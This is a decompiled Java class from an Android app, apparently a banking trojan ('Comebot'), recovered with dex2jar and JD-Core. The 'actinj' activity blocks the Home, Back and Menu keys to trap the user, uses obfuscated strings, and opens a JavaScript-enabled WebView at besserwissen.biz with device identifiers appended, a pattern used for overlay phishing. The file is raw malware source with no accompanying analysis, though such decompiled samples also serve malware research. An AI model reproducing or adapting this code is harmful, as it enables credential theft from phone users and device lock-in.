package anu_bispro.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class actinj extends Activity {
  d a = new d();
  
  a b = new a();
  
  b c = new b();
  
  public void onBackPressed() {
    super.onBackPressed();
  }
  
  @SuppressLint({"SetJavaScriptEnabled"})
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903042);
  }
  
  public void onDestroy() {
    super.onDestroy();
    this.b.a((Context)this, b.a("HZK^"), d.a("@\021J\003C"));
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
    boolean bool1 = true;
    if (paramInt == 3)
      return bool1; 
    boolean bool2 = bool1;
    if (paramInt != 4) {
      bool2 = bool1;
      if (paramInt != 82)
        bool2 = false; 
    } 
    return bool2;
  }
  
  protected void onPause() {
    super.onStop();
    this.b.a((Context)this, b.a("HZK^"), d.a("@\021J\003C"));
  }
  
  protected void onStart() {
    super.onStart();
    this.b.a((Context)this, b.a("HZK^"), d.a("\004T\005C"));
    String str = getIntent().getStringExtra(b.a("HRI"));
    if (!str.equals("") || !str.equals(null)) {
      WebView webView = (WebView)findViewById(2131230722);
      webView.getSettings().setJavaScriptEnabled(true);
      webView.setScrollBarStyle(0);
      webView.setWebViewClient(new WebViewClient());
      webView.setWebChromeClient(new WebChromeClient());
      StringBuilder stringBuilder = new StringBuilder();
      this.a.getClass();
      webView.loadUrl(stringBuilder.insert(0, "http://besserwissen.biz").append(d.a("\t\031H\032\t")).append(str).append(b.a("\025VSV\004V\006")).append(this.b.a((Context)this)).append(d.a("Z")).append(this.b.c((Context)this)).toString());
    } 
  }
  
  protected void onStop() {
    super.onStop();
    this.b.a((Context)this, b.a("HZK^"), d.a("@\021J\003C"));
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/actinj.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */